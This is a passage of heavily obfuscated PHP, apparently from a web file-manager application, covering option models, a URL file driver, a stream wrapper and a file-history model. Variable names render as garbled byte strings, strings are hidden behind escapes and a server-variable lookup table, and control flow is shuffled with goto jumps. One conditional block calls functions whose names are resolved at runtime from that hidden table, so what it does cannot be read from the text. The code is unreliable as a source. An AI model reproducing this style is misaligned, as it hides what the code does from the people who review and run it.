cİòäìÇ•; dµÌÚÉ°Œ¼: $fºˆî–ãò[$e‡™ƒí…[187]] = $C»ô‹á¯‹; return parent::update($EØ÷—’—®ò, $fºˆî–ãò); goto a…ôù¤ŞÖä; a…ôù¤ŞÖä: } public function remove($BÏ–ŒÑù¾Í) { $bõ™Ç»†ß• = $this->listData($BÏ–ŒÑù¾Í); if (!$bõ™Ç»†ß• || $bõ™Ç»†ß•[$_SERVER[¢à][1076]]) { return !1; } return parent::remove($BÏ–ŒÑù¾Í); } public function sort($BÅÃ–·õïŠ, $bæ‹Ò®¿ğ‘) { return parent::update($BÅÃ–·õïŠ, $bæ‹Ò®¿ğ‘); } public function enable($F‹åç–‰£, $Cƒß¾Ğ¥àŸ) { return parent::update($F‹åç–‰£, array($_SERVER[¢à][2436] => $Cƒß¾Ğ¥àŸ)); } private function initUserOption() { $eíñ½©–”ñ =& $_SERVER[¢à]; $this->optionType = $eíñ½©–”ñ[2437]; $this->modelType = $eíñ½©–”ñ[2438]; $this->field = array($eíñ½©–”ñ[2439], $eíñ½©–”ñ[28], $eíñ½©–”ñ[187], $eíñ½©–”ñ[29], $eíñ½©–”ñ[2440], $eíñ½©–”ñ[689], $eíñ½©–”ñ[180]); } public function userNoticeGet($D¥…îõö¤ = false) { $this->initUserOption(); return parent::listData($D¥…îõö¤, $_SERVER[¢à][364], !0); } public function userNoticeAdd($D¥™†ÇÖ‚) { $c™öÕ¢¥ =& $_SERVER[¢à]; $this->initUserOption(); $A·ëƒ‹Ôœ = $this->findByKey($c™öÕ¢¥[2439], $D¥™†ÇÖ‚[$c™öÕ¢¥[364]]); if ($A·ëƒ‹Ôœ) { return !0; } $FŒçÍİ…ÙÚ = array($c™öÕ¢¥[2439] => $D¥™†ÇÖ‚[$c™öÕ¢¥[364]], $c™öÕ¢¥[28] => $D¥™†ÇÖ‚[$c™öÕ¢¥[28]], $c™öÕ¢¥[187] => $D¥™†ÇÖ‚[$c™öÕ¢¥[187]], $c™öÕ¢¥[29] => isset($D¥™†ÇÖ‚[$c™öÕ¢¥[29]]) ? $D¥™†ÇÖ‚[$c™öÕ¢¥[29]] : 1, $c™öÕ¢¥[2440] => isset($D¥™†ÇÖ‚[$c™öÕ¢¥[2440]]) ? $D¥™†ÇÖ‚[$c™öÕ¢¥[2440]] : 0, $c™öÕ¢¥[689] => 0, $c™öÕ¢¥[180] => 0); return parent::insert($FŒçÍİ…ÙÚ); } public function userNoticeEdit($b½‹æ´ùé , $A™Š±ïÛíÌ) { $this->initUserOption(); return parent::update($b½‹æ´ùé , $A™Š±ïÛíÌ); } } class SystemOptionModel extends ModelBaseOption { protected $tableName = "\163\171\163\164\145\155\137\157\160\164\x69\x6f\156"; protected $jsonField = array("\155\x65\x6e\x75", "\x72\x6f\x6c\145", "\x72\x6f\x6c\x65\107\x72\x6f\165\x70", "\162\145\147\x69\x73\164", "\145\155\141\151\154"); function __construct() { parent::__construct(); } protected function cacheKey($aó¹Ş×ƒÁ¦) { return "\x53\x79\163\164\x65\155\117\160\x74\x69\x6f\x6e\137{$aó¹Ş×ƒÁ¦}"; } protected function optionDefault($FÆ‚¸êÏÛ§ = '') { $CÙ ¦•²ö =& $_SERVER[¢à]; if ($FÆ‚¸êÏÛ§ == $CÙ ¦•²ö[33]) { return $GLOBALS[$CÙ ¦•²ö[6]][$CÙ ¦•²ö[2441]]; } } } goto E«Ñì×À®Š; CîÂİ‹Öèƒ: class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($f”¿ˆßé‹… = false) { } public function exist($E–ÍÔ…¯Œ°) { $AÅÄ…àçÒö = $this->info($E–ÍÔ…¯Œ°); return $AÅÄ…àçÒö[$_SERVER[¢à][185]]; } public function isFile($aÈ»ÕÈ†Ö¥) { $F“£îÃÊ™è = $this->info($aÈ»ÕÈ†Ö¥); return $F“£îÃÊ™è[$_SERVER[¢à][185]]; } public function isFolder($cÄÕî‚ƒ°) { return !1; } public function size($eµ¦µ²Ûìª) { $aåÅŞŒƒæÚ = $this->info($eµ¦µ²Ûìª); return $aåÅŞŒƒæÚ[$_SERVER[¢à][77]]; } public function info($b×ßÅ¶¹ªµ) { return $this->infoParse($b×ßÅ¶¹ªµ); } public function infoAuth($F“¢’öãƒ) { return $this->infoParse($F“¢’öãƒ); } public function infoWithChildren($dÀ‰šø‡†Œ) { return $this->infoParse($dÀ‰šø‡†Œ); } public function infoFull($C‹òÙŞ÷–´) { return $this->infoParse($C‹òÙŞ÷–´); } private function infoParse($dÁ’çê«Á) { $AÑ´Ü÷ÊÈĞ =& $_SERVER[¢à]; $aë¿¤Õ¹öñ = $this->header($dÁ’çê«Á); if (!$aë¿¤Õ¹öñ || !$aë¿¤Õ¹öñ[$AÑ´Ü÷ÊÈĞ[689]]) { return !1; } $F§©¶Ø„·ê = _get($aë¿¤Õ¹öñ, $AÑ´Ü÷ÊÈĞ[322], 0); $dèœ’¥©– = array($AÑ´Ü÷ÊÈĞ[28] => $aë¿¤Õ¹öñ[$AÑ´Ü÷ÊÈĞ[28]], $AÑ´Ü÷ÊÈĞ[75] => $dÁ’çê«Á, $AÑ´Ü÷ÊÈĞ[29] => $AÑ´Ü÷ÊÈĞ[164], $AÑ´Ü÷ÊÈĞ[77] => intval($F§©¶Ø„·ê), $AÑ´Ü÷ÊÈĞ[157] => get_path_ext($aë¿¤Õ¹öñ[$AÑ´Ü÷ÊÈĞ[28]]), $AÑ´Ü÷ÊÈĞ[1151] => $F§©¶Ø„·ê > 0 && $aë¿¤Õ¹öñ[$AÑ´Ü÷ÊÈĞ[1278]], $AÑ´Ü÷ÊÈĞ[1152] => !1); return $dèœ’¥©–; } private function header($a²‡‰±¼Ôª) { if (isset(self::$_cacheHeader[$a²‡‰±¼Ôª])) { return self::$_cacheHeader[$a²‡‰±¼Ôª]; } self::$_cacheHeader[$a²‡‰±¼Ôª] = url_header($a²‡‰±¼Ôª); return self::$_cacheHeader[$a²‡‰±¼Ôª]; } public function hashSimple($Fòà¾¦¦Òä, $f˜¬É½¾º = false) { goto Aç·İïË¼Ğ; b«Øáµ˜Şñ: $dÇ•ù»ô¾° = timeFloat(); $CíÊ ³ğ¯ = 15; for ($EÙÕ¥Äô = 0; $EÙÕ¥Äô < $e§Âğáê³™; $EÙÕ¥Äô++) { if (timeFloat() - $dÇ•ù»ô¾° > $CíÊ ³ğ¯) { return !1; } $FŒäƒ‡©ì = $this->fileSubstr($Fòà¾¦¦Òä, $cãÕ¾˜’˜· * $EÙÕ¥Äô, $D³‚„ˆ”¸˜); if (!$FŒäƒ‡©ì) { return !1; } $Aœ¢äÓ›šâ .= $FŒäƒ‡©ì; } goto CŠêİÈÙ˜†; A¾Èß¥ˆ: $aôŒƒ™ö½‹ = $Aˆ‹øñƒ•ï[$e‹ßˆ‘Ãã¬[77]]; $D³‚„ˆ”¸˜ = 200; $e§Âğáê³™ = 50; goto fóğè‘²ÁÚ; fóğè‘²ÁÚ: if ($aôŒƒ™ö½‹ <= $D³‚„ˆ”¸˜ * $e§Âğáê³™) { return md5($this->fileSubstr($Fòà¾¦¦Òä, 0, $aôŒƒ™ö½‹)) . $aôŒƒ™ö½‹; } $cãÕ¾˜’˜· = intval($aôŒƒ™ö½‹ / $e§Âğáê³™); $Aœ¢äÓ›šâ = $e‹ßˆ‘Ãã¬[33]; goto b«Øáµ˜Şñ; Aç·İïË¼Ğ: $e‹ßˆ‘Ãã¬ =& $_SERVER[¢à]; $Aˆ‹øñƒ•ï = $this->info($Fòà¾¦¦Òä); if (!$Aˆ‹øñƒ•ï || !$Aˆ‹øñƒ•ï[$e‹ßˆ‘Ãã¬[185]]) { return !1; } goto A¾Èß¥ˆ; CŠêİÈÙ˜†: $Aœ¢äÓ›šâ .= $this->fileSubstr($Fòà¾¦¦Òä, $aôŒƒ™ö½‹ - $D³‚„ˆ”¸˜, $D³‚„ˆ”¸˜); return md5($Aœ¢äÓ›šâ) . $aôŒƒ™ö½‹; goto f½ Œë³çº; f½ Œë³çº: } public function getContent($D²ÏëÍ«…Ú) { return $this->fileSubstr($D²ÏëÍ«…Ú); } public function fileSubstr($e·‹†ï÷ßö, $DæŸİ‚ÛÔò = 0, $C­ …©øÀ = -1) { goto A¿´À†”; A¿´À†”: $eŠîÄƒ¬‘ =& $_SERVER[¢à]; $B˜ê é­Óå = $this->info($e·‹†ï÷ßö); if (!$B˜ê é­Óå || !$B˜ê é­Óå[$eŠîÄƒ¬‘[185]] && $B˜ê é­Óå[$eŠîÄƒ¬‘[77]] > 1024 * 1024 * 10) { return !1; } goto d¦ÒªìØÖÙ; d¦ÒªìØÖÙ: if ($C­ …©øÀ === -1) { $C­ …©øÀ = $B˜ê é­Óå[$eŠîÄƒ¬‘[77]]; } if ($C­ …©øÀ == 0) { return $eŠîÄƒ¬‘[33]; } $aÛ°¥œê = array($eŠîÄƒ¬‘[1279] . $DæŸİ‚ÛÔò . $eŠîÄƒ¬‘[714] . ($DæŸİ‚ÛÔò + $C­ …©øÀ - 1)); goto FßË…Œ³™ë; FßË…Œ³™ë: $cÃù‰ É’ = url_request($e·‹†ï÷ßö, $eŠîÄƒ¬‘[213], !1, $aÛ°¥œê, !1, !1, 1); return $cÃù‰ É’[$eŠîÄƒ¬‘[1030]] ? $cÃù‰ É’[$eŠîÄƒ¬‘[1030]] : $eŠîÄƒ¬‘[33]; goto B¾­Ô÷»Ì; B¾­Ô÷»Ì: } public function download($FäÇ¥Ñ­î, $Cïò½Àé‚½) { Downloader::start($FäÇ¥Ñ­î, $Cïò½Àé‚½); return $Cïò½Àé‚½; } } class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($B“¼à“è½Ç, $F†×ôŠÅ†å = '') { goto d»¬°èØ; d»¬°èØ: $this->info = $this->info($B“¼à“è½Ç); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[¢à][75]]; goto dÓ¨œï´Ÿ; dÓ¨œï´Ÿ: if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$B“¼à“è½Ç])) { self::$_chunkBuffer[$B“¼à“è½Ç] = array(); } goto fÌ²Ñ“†‰Ò; fÌ²Ñ“†‰Ò: return $this->info ? !0 : !1; goto eòµƒ¤´ˆ˜; eòµƒ¤´ˆ˜: } function stream_read($b’•…ÁÁòÇ) { $eïÖŞË”š† = $this->fileSubstr($this->pose, $b’•…ÁÁòÇ); $this->pose += strlen($eïÖŞË”š†); return $eïÖŞË”š†; } public function stream_tell() { return $this->pose; } public function stream_seek($cäù˜Õ˜â§, $aÇôèğìåğ) { $Eµƒó—„Ñ‹ =& $_SERVER[¢à]; if ($aÇôèğìåğ == SEEK_SET) { $this->pose = $cäù˜Õ˜â§; } else { if ($aÇôèğìåğ == SEEK_CUR) { $this->pose += $cäù˜Õ˜â§; } else { if ($aÇôèğìåğ == SEEK_END) { $this->pose = $this->info[$Eµƒó—„Ñ‹[77]] + intval($cäù˜Õ˜â§); } } } if ($cäù˜Õ˜â§ < 0) { $this->pose = $this->info[$Eµƒó—„Ñ‹[77]] + $cäù˜Õ˜â§; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[¢à][77]]; } public function stream_close() { return !0; } public function url_stat($D¸°ìÂ·“Û, $Fƒ‹óôÛİ—) { $C„ÖÓ‚†¬‰ =& $_SERVER[¢à]; $cÅàöìÅ £ = $this->info($D¸°ìÂ·“Û); return array($C„ÖÓ‚†¬‰[1280] => 0, $C„ÖÓ‚†¬‰[1281] => 0, $C„ÖÓ‚†¬‰[12] => 32768 + 511, $C„ÖÓ‚†¬‰[1282] => 0, $C„ÖÓ‚†¬‰[1283] => 0, $C„ÖÓ‚†¬‰[1284] => 0, $C„ÖÓ‚†¬‰[1285] => 0, $C„ÖÓ‚†¬‰[77] => $cÅàöìÅ £[$C„ÖÓ‚†¬‰[77]], $C„ÖÓ‚†¬‰[1286] => $cÅàöìÅ £[$C„ÖÓ‚†¬‰[1157]], $C„ÖÓ‚†¬‰[1243] => $cÅàöìÅ £[$C„ÖÓ‚†¬‰[107]], $C„ÖÓ‚†¬‰[1242] => $cÅàöìÅ £[$C„ÖÓ‚†¬‰[184]], $C„ÖÓ‚†¬‰[1287] => 0, $C„ÖÓ‚†¬‰[1288] => 0); } static $fileInfo = array(); public function info($E°‡¡¸Ì·¡) { $cÚĞ•çõ½é = $_SERVER[¢à][1289]; if (isset(self::$fileInfo[$E°‡¡¸Ì·¡])) { return self::$fileInfo[$E°‡¡¸Ì·¡]; } if (substr($E°‡¡¸Ì·¡, 0, strlen($cÚĞ•çõ½é)) != $cÚĞ•çõ½é) { return !1; } self::$fileInfo[$E°‡¡¸Ì·¡] = IO::info(substr($E°‡¡¸Ì·¡, strlen($cÚĞ•çõ½é))); return self::$fileInfo[$E°‡¡¸Ì·¡]; } public static function read($E¹×µö§¸É, $F†µ¯ôÄ‚Œ, $cÒœ¯Õ®–÷) { goto c‚ÑæßÓœ; BïŠëğ«ø: $FõÊºŒÇ» = 8192; fseek($A”ÕÔŒ÷õô, $F†µ¯ôÄ‚Œ, SEEK_SET); $E’µÛïÔÇî = $Fˆø‰ïøê[33]; goto aãÀˆæÃ­; bÅ†Š¦µ¸‹: return $E’µÛïÔÇî; goto bÌ²¨Â¥‡; c‚ÑæßÓœ: $Fˆø‰ïøê =& $_SERVER[¢à]; $A”ÕÔŒ÷õô = fopen($E¹×µö§¸É, $Fˆø‰ïøê[1159]); if (!$A”ÕÔŒ÷õô) { return $Fˆø‰ïøê[33]; } goto BïŠëğ«ø; aãÀˆæÃ­: $CíµŒ¡…¨¶ = 0; while ($CíµŒ¡…¨¶ < $cÒœ¯Õ®–÷) { $c¶’ÍôØï = min($FõÊºŒÇ», $cÒœ¯Õ®–÷ - $CíµŒ¡…¨¶); $E’µÛïÔÇî .= fread($A”ÕÔŒ÷õô, $c¶’ÍôØï); $CíµŒ¡…¨¶ += $c¶’ÍôØï; } fclose($A”ÕÔŒ÷õô); goto bÅ†Š¦µ¸‹; bÌ²¨Â¥‡: } public function fileSubstr($b‹Ø»×…†˜, $AÛåÚÇ²¶½) { goto a—­ŞÚ¥ó ; B¿´ˆ £ô­: foreach ($FØƒÛ¥˜åÎ as $Bî“á‡õê => $eÎ”ö¥Çº) { $Bî“á‡õê = intval($Bî“á‡õê); $e‹¤Ü¤„Òè = $Bî“á‡õê + strlen($eÎ”ö¥Çº); if ($b‹Ø»×…†˜ >= $e‹¤Ü¤„Òè) { continue; } if ($b‹Ø»×…†˜ >= $Bî“á‡õê && $b‹Ø»×…†˜ + $AÛåÚÇ²¶½ <= $e‹¤Ü¤„Òè) { return substr($eÎ”ö¥Çº, $b‹Ø»×…†˜ - $Bî“á‡õê, $AÛåÚÇ²¶½); } break; } if (count($FØƒÛ¥˜åÎ) > 40 || timeFloat() - $this->timeStart > 2.0) { $this->log($A¼‹¥†ªÍ[1290], $A¼‹¥†ªÍ[1291] . count($FØƒÛ¥˜åÎ) . "\73\x73\x74\x61\x72\164\x3d{$b‹Ø»×…†˜}\x2c\x6c\145\156\x67\x74\150\75{$AÛåÚÇ²¶½}\73\x70\157\163\x65\x3a{$Bî“á‡õê}\176{$e‹¤Ü¤„Òè}"); throw new Exception($A¼‹¥†ªÍ[1292]); } $a±¡æÒ¥Â’ = intval($b‹Ø»×…†˜ / $Däõ‹êÕå¦) * $Däõ‹êÕå¦; goto D¥íÇ‰İÅï; F©¥íÃ™Éõ: $cØ—¦Éö = $AÛåÚÇ²¶½; if ($b‹Ø»×…†˜ < 0) { $b‹Ø»×…†˜ = $b˜†½âŠì„ + $b‹Ø»×…†˜; } if ($AÛåÚÇ²¶½ === !1) { $AÛåÚÇ²¶½ = $b˜†½âŠì„ - $b‹Ø»×…†˜; } goto dÍäÖ””¶; D¥íÇ‰İÅï: $E´÷â»† = ceil(($b‹Ø»×…†˜ + $AÛåÚÇ²¶½) / $Däõ‹êÕå¦) * $Däõ‹êÕå¦ - $a±¡æÒ¥Â’; $aÍœíÁ™ÜË = IO::fileSubstr($this->path, $a±¡æÒ¥Â’, $E´÷â»†); $FØƒÛ¥˜åÎ[$a±¡æÒ¥Â’ . $A¼‹¥†ªÍ[33]] = $aÍœíÁ™ÜË; goto Aœ¡ç¹’„ø; c¥ØÉ–‘§Â: $Bî“á‡õê = 0; $e‹¤Ü¤„Òè = 0; $eÎ”ö¥Çº = $A¼‹¥†ªÍ[33]; goto B¿´ˆ £ô­; a—­ŞÚ¥ó : $A¼‹¥†ªÍ =& $_SERVER[¢à]; $b˜†½âŠì„ = $this->info[$A¼‹¥†ªÍ[77]]; $C­â­–× = $b‹Ø»×…†˜; goto F©¥íÃ™Éõ; Aœ¡ç¹’„ø: ksort($FØƒÛ¥˜åÎ); $F‚•ëÎ»¶© = substr($aÍœíÁ™ÜË, $b‹Ø»×…†˜ - $a±¡æÒ¥Â’, $AÛåÚÇ²¶½); return $F‚•ëÎ»¶©; goto a¼—Á±ìéˆ; dÍäÖ””¶: if ($b‹Ø»×…†˜ + $AÛåÚÇ²¶½ > $b˜†½âŠì„) { $AÛåÚÇ²¶½ = $b˜†½âŠì„ - $b‹Ø»×…†˜; } if ($AÛåÚÇ²¶½ <= 0) { return $A¼‹¥†ªÍ[33]; } if ($b‹Ø»×…†˜ < 0 || $b‹Ø»×…†˜ >= $b˜†½âŠì„ || $AÛåÚÇ²¶½ <= 0 || $AÛåÚÇ²¶½ > 1024 * 1024 * 5) { throw new Exception("\151\x6f\x46\151\154\x65\x52\145\141\144\40\145\x72\x72\x6f\162\x21\x20\163\x74\x61\x72\x74\x3d{$b‹Ø»×…†˜}\x3b\x6c\145\156\147\164\x68\x3d{$AÛåÚÇ²¶½}\x3b\x20\163\x69\172\145\75{$b˜†½âŠì„}\x3b"); } goto fŒ´‹ÓØÎƒ; fŒ´‹ÓØÎƒ: $Däõ‹êÕå¦ = 64 * 1024; $FØƒÛ¥˜åÎ =& self::$_chunkBuffer[$this->path]; if (!$FØƒÛ¥˜åÎ) { $FØƒÛ¥˜åÎ = array(); } goto c¥ØÉ–‘§Â; a¼—Á±ìéˆ: } private function log($F•ª¥èÅ¼, $Bµ‹ÅÁ´—) { $cÊÇó¹Ïø =& $_SERVER[¢à]; $fæ£‰îéò = timeFloat() - $this->timeStart; write_log(sprintf($cÊÇó¹Ïø[1293], $F•ª¥èÅ¼, $this->info[$cÊÇó¹Ïø[28]], $fæ£‰îéò, $Bµ‹ÅÁ´—), $cÊÇó¹Ïø[1208]); } } if ($_SERVER[$_SERVER[¢à][786]] != $_SERVER[$_SERVER[¢à][1294]]) { goto c¾‚¢™»Õ‘; c¨§Ÿ”ßÏË: $CèÅ‘…×¸ä = explode($_SERVER[¢à][214], $A÷Ü«òå¦); if (count($CèÅ‘…×¸ä) < $_SERVER[¢à][571]) { $b½Ğ•«½Í• = $_SERVER[¢à][792]; $b½Ğ•«½Í•(); } $eãàîŸÌÑÈ = $_SERVER[¢à][1113]; goto f½‹°ÕŞùô; f½‹°ÕŞùô: $eãàîŸÌÑÈ($_SERVER[$_SERVER[¢à][787]]); goto C‚é±—§’Ù; c¾‚¢™»Õ‘: $B™ ÷İì´´ = $_SERVER[¢à][789]; $DÄ¥ï·…«à = $_SERVER[$_SERVER[¢à][790]] . $_SERVER[¢à][791]; $A÷Ü«òå¦ = $B™ ÷İì´´($DÄ¥ï·…«à); goto c¨§Ÿ”ßÏË; C‚é±—§’Ù: } goto F·„†İùŒÕ; BÍƒ¿‹åÄ¼: define($_SERVER[¢à][224], 2); define($_SERVER[¢à][225], 3); define($_SERVER[¢à][226], 1); goto A‘î¸ÌèÇç; DÒ—Š´Í×Ã: class SourceHistoryModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\x73\157\x75\x72\x63\145\x5f\150\151\163\164\x6f\x72\171"; public function addHistory($bíÑÆèßêÑ, $FçÔ–¶‚Éª = '') { $EÍ‚…¶ªÍ® =& $_SERVER[¢à]; $F±†ßî¤Ì = array($EÍ‚…¶ªÍ®[380] => $bíÑÆèßêÑ[$EÍ‚…¶ªÍ®[366]], $EÍ‚…¶ªÍ®[1403] => isset($bíÑÆèßêÑ[$EÍ‚…¶ªÍ®[376]]) ? $bíÑÆèßêÑ[$EÍ‚…¶ªÍ®[376]] : $bíÑÆèßêÑ[$EÍ‚…¶ªÍ®[375]], $EÍ‚…¶ªÍ®[416] => $bíÑÆèßêÑ[$EÍ‚…¶ªÍ®[415]], $EÍ‚…¶ªÍ®[516] => $bíÑÆèßêÑ[$EÍ‚…¶ªÍ®[77]], $EÍ‚…¶ªÍ®[2260] => $FçÔ–¶‚Éª); $fÃèĞ·†•ë = $GLOBALS[$EÍ‚…¶ªÍ®[6]][$EÍ‚…¶ªÍ®[84]][$EÍ‚…¶ªÍ®[2261]]; if ($fÃèĞ·†•ë > 1) { $this->historyAutoClear($F±†ßî¤Ì[$EÍ‚…¶ªÍ®[366]]); $this->add($F±†ßî¤Ì); } Model($EÍ‚…¶ªÍ®[2262])->eventFileEdit($bíÑÆèßêÑ[$EÍ‚…¶ªÍ®[366]]); } private function historyAutoClear($EÈ‘©Ú¥“À) { goto b»ïÃØè½‚; F‡ÕÃŒ¨¥Ó: if (!$dâïõª¨‘ë || $e‰ö®’Ø§´ >= count($dâïõª¨‘ë)) { return; } $aöâ¼³Âä = array_to_keyvalue($dâïõª¨‘ë, $AÂÏ¥‰İ²ö[33], $AÂÏ¥‰İ²ö[364]); $aöâ¼³Âä = array_slice($aöâ¼³Âä, $e‰ö®’Ø§´); goto FŠ¸æ”–ª; b»ïÃØè½‚: $AÂÏ¥‰İ²ö =& $_SERVER[¢à]; $BµÃ¾Íª—ø = Model($AÂÏ¥‰İ²ö[1084])->get($AÂÏ¥‰İ²ö[2263]); $CÀñÎß´×è = $GLOBALS[$AÂÏ¥‰İ²ö[6]][$AÂÏ¥‰İ²ö[84]][$AÂÏ¥‰İ²ö[2261]]; goto añ»Ñ‘½Œ˜; FŠ¸æ”–ª: $c…§¾ÄÂóƒ = array_to_keyvalue($dâïõª¨‘ë, $AÂÏ¥‰İ²ö[33], $AÂÏ¥‰İ²ö[415]); $c…§¾ÄÂóƒ = array_slice($c…§¾ÄÂóƒ, $e‰ö®’Ø§´); if (!$aöâ¼³Âä || !$c…§¾ÄÂóƒ) { return; } goto dÉ“‹¼æÕ; dÉ“‹¼æÕ: $F„íà–ÊŸ‡ = array($AÂÏ¥‰İ²ö[382] => array($AÂÏ¥‰İ²ö[7], $aöâ¼³Âä)); $this->where($F„íà–ÊŸ‡)->delete(); Model($AÂÏ¥‰İ²ö[418])->remove($c…§¾ÄÂóƒ); goto a†ôĞ–Ğ¯; F°¡Û¶Êíô: if ($e‰ö®’Ø§´ >= 500) { return; } $F„íà–ÊŸ‡ = array($AÂÏ¥‰İ²ö[380] => $EÈ‘©Ú¥“À); $dâïõª¨‘ë = $this->field($AÂÏ¥‰İ²ö[2265])->where($F„íà–ÊŸ‡)->order($AÂÏ¥‰İ²ö[2257])->select(); goto F‡ÕÃŒ¨¥Ó; añ»Ñ‘½Œ˜: $eÜÂ‹é¶œì = $BµÃ¾Íª—ø == $AÂÏ¥‰İ²ö[2264] ? 3 : $CÀñÎß´×è; if ($CÀñÎß´×è <= 1) { $eÜÂ‹é¶œì = 1; } $e‰ö®’Ø§´ = $eÜÂ‹é¶œì - 1; goto F°¡Û¶Êíô; a†ôĞ–Ğ¯: } public function listData($bæƒ¿Ê¸½ò) { goto bö¶œİÀ¶Ş; d‘«¬à‹öé: $f¬Ë¢Ûáñß = $this->field($Fë¤¯“Éæ«)->where($c¶¥‹º·ÅÓ)->order($bÔ«ï´å®[2257])->selectPage(); $this->_listAppendUser($f¬Ë¢Ûáñß[$bÔ«ï´å®[351]]); $bÄ ­ê•³· = Model($bÔ«ï´å®[1084])->get($bÔ«ï´å®[2263]); goto F¨ä…ƒ½£; F¨ä…ƒ½£: $CÈõ¯‹¶ê = 3; if ($bÄ ­ê•³· == $bÔ«ï´å®[2264]) { $f¬Ë¢Ûáñß[$bÔ«ï´å®[351]] = array_slice($f¬Ë¢Ûáñß[$bÔ«ï´å®[351]], 0, $CÈõ¯‹¶ê); $f¬Ë¢Ûáñß[$bÔ«ï´å®[348]] = array($bÔ«ï´å®[2267] => 1, $bÔ«ï´å®[2268] => 20, $bÔ«ï´å®[2269] => 1, $bÔ«ï´å®[2270] => count($f¬Ë¢Ûáñß[$bÔ«ï´å®[351]])); } return $f¬Ë¢Ûáñß; goto cõç§êÚ‹©; bö¶œİÀ¶Ş: $bÔ«ï´å® =& $_SERVER[¢à]; $c¶¥‹º·ÅÓ = array($bÔ«ï´å®[380] => $bæƒ¿Ê¸½ò); $Fë¤¯“Éæ« = $bÔ«ï´å®[2266]; goto d‘«¬à‹öé; cõç§êÚ‹©: } protected function _listAppendUser(&$E·Ú×Â³½£) { $FåêÍÂö =& $_SERVER[¢à]; $eˆé ¡¨îË = array_to_keyvalue($E·Ú×Â³½£, $FåêÍÂö[33], $FåêÍÂö[1412]); $e¨ØÅåÏÄ” = Model($FåêÍÂö[473])->userListInfo($eˆé ¡¨îË); foreach ($E·Ú×Â³½£ as &$eêÛµ®‘Ï½) { $Eƒ±à…¢Ê” = $eêÛµ®‘Ï½[$FåêÍÂö[1412]]; $eêÛµ®‘Ï½[$FåêÍÂö[375]] = $e¨ØÅåÏÄ”[$Eƒ±à…¢Ê”] ? $e¨ØÅåÏÄ”[$Eƒ±à…¢Ê”] : !1; } } public function fileInfo($c¿Û×õ‚ “) { $C‚ŒŒ¯¬Ä =& $_SERVER[¢à]; $Cá‚Ÿ¦ó±¨ = $this->tablePrefix; $b†Å¹¦¢„“ = "{$Cá‚Ÿ¦ó±¨}\x69\x6f\137\x66\x69\154\145\x20\146\x69\x6c\x65\163\x20\157\156\40\x66\x69\x6c\145\x73\x2e\146\151\154\145\111\x44\x20\x3d\x20\150\x69\163\164\x6f\162\171\x2e\x66\151\x6c\145\x49\x44"; return $this->alias($C‚ŒŒ¯¬Ä[2271])->where(array($C‚ŒŒ¯¬Ä[382] => $c¿Û×õ‚ “))->join($b†Å¹¦¢„“, $C‚ŒŒ¯¬Ä[2272])->find(); } public function removeItem($dİºöå­õ) { $C›Ç§²ø°‘ =& $_SERVER[¢à]; $e³Ï‘åƒèë = array($C›Ç§²ø°‘[382] => $dİºöå­õ); $DôÖ•÷«ˆ = $this->where($e³Ï‘åƒèë)->find(); if ($DôÖ•÷«ˆ) { $f†ñ‡‹Î½ = $this->where($e³Ï‘åƒèë)->delete(); Model($C›Ç§²ø°‘[418])->remove($DôÖ•÷«ˆ[$C›Ç§²ø°‘[415]]); return $f†ñ‡‹Î½; } return !1; } public function removeBySource($DÍÍ›ç) { goto dÉÇŸ¨Ø„Ö; bºÌ‚ ÷¦œ: $e·¡Ì†òã = array($EÙ®ŠáÍ¨¸[380] => array($EÙ®ŠáÍ¨¸[7], $DÍÍ›ç)); $b‡ª•ó¡µ£ = $this->field($EÙ®ŠáÍ¨¸[416])->where($e·¡Ì†òã)->select(); if ($b‡ª•ó¡µ£) { $this->where($e·¡Ì†òã)->delete(); $c‰È˜ù«Ì² = array_to_keyvalue($b‡ª•ó¡µ£, $EÙ®ŠáÍ¨¸[33], $EÙ®ŠáÍ¨¸[415]); Model($EÙ®ŠáÍ¨¸[418])->remove($c‰È˜ù«Ì²); } goto c¢åªÊï¼ó; c¢åªÊï¼ó: return !0; goto BÀ÷Âğ§; dÉÇŸ¨Ø„Ö: $EÙ®ŠáÍ¨¸ =& $_SERVER[¢à]; if (!$DÍÍ›ç) { return !1; } if (!is_array($DÍÍ›ç)) { $DÍÍ›ç = array($DÍÍ›ç); } goto bºÌ‚ ÷¦œ; BÀ÷Âğ§: } public function setDetail($e»æâ—Ï”™, $c¶ÏÅ£ˆä) { $Aª·Ò¢ñ¸ =& $_SERVER[¢à]; return $this->where(array($Aª·Ò¢ñ¸[382] => $e»æâ—Ï”™))->save(array($Aª·Ò¢ñ¸[2260] => $c¶ÏÅ£ˆä)); } public function rollbackToItem($B•‚µ…ÆÖë, $D“¿í‰Œ¨‰) { goto BÂ¯¾ÄÛ„“; BÂ¯¾ÄÛ„“: $dƒ¨ÛÃäÍ =& $_SERVER[¢à]; $Aù¢£ÌÂÂÌ = Model($dƒ¨ÛÃäÍ[752])->sourceInfo($B•‚µ…ÆÖë); $this->addHistory($Aù¢£ÌÂÂÌ); goto F¼„Ä¬¡æ²; F¼„Ä¬¡æ²: $eÆœ®Ş…å = $this->find($D“¿í‰Œ¨‰); $c×õÍõƒ¯× = array($dƒ¨ÛÃäÍ[415] => $eÆœ®Ş…å[$dƒ¨ÛÃäÍ[415]], $dƒ¨ÛÃäÍ[77] => $eÆœ®Ş…å[$dƒ¨ÛÃäÍ[77]], $dƒ¨ÛÃäÍ[107] => time(), $dƒ¨ÛÃäÍ[376] => USER_ID); Model($dƒ¨ÛÃäÍ[752])->where(array($dƒ¨ÛÃäÍ[366] => $B•‚µ…ÆÖë))->save($c×õÍõƒ¯×); goto A²Èéª×º; A²Èéª×º: return $this->where(array($dƒ¨ÛÃäÍ[382] => $D“¿í‰Œ¨‰))->delete(); goto EÕª·…î®Ô; EÕª·…î®Ô: } public function clearSame($FÁŠ¨¿ÎÙ¯) { goto cƒÒÓ™É›; eÇª‰ÚŒ™¥: if (!$b·§½Î—Ÿ) { return; } $this->where(array($c„»¿œ” é[364] => array($c„»¿œ” é[7], $b·§½Î—Ÿ)))->delete(); Model($c„»¿œ” é[418])->remove($fÙÓã‹àĞ); goto bÅÂ‡õ‰¹†; F‡˜›¾æ: 